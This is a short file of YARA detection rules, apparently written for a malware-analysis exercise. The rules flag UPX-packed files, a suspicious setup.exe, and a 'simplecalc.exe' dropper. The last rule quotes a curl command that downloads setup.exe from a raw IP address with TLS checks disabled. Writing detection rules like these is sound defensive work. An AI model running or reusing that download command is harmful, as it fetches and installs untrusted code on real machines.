rule dasuwerugwuerwq{
	meta:
		description = "finds keyboard smash"
		author = "benjamin coombe"
		date = "10/4/2025"
	strings:
		$upx1 = "upx" ascii nocase
		$upx2 = "UPX1" ascii nocase
		$upx3 = "UPX2" ascii nocase
//		$http = "http" nocase
//		$file = "setup.exe" nocase
//		$string1 = "thug" nocase
//		$string2 = "lyfe" nocase
	condition:
//		(
		any of ($upx*) 
//		and
//		$file and
//		$http and
//		any of ($string*)
//		)
}

rule setup{
	meta:
		description = "finds the sus setup.exe"
		author = "benjamin coombe"
		date = "10/4/2025"
	strings:
		$mean = "I'm really mean. RAAAAH!"
		$dos = /This program cannot be run in DOS mode/
	condition:
	(
	$mean and
	#dos >= 2
	)
}

rule simplecalc {
	meta:
		description = "finds simplecalc.exe"
		author = "benjamin coombe"
		date = "10/4/2025"
	strings:
		$curl = "curl -k -o setup.exe https://165.73.244.11/installers/setup.exe"
	condition:
	$curl
}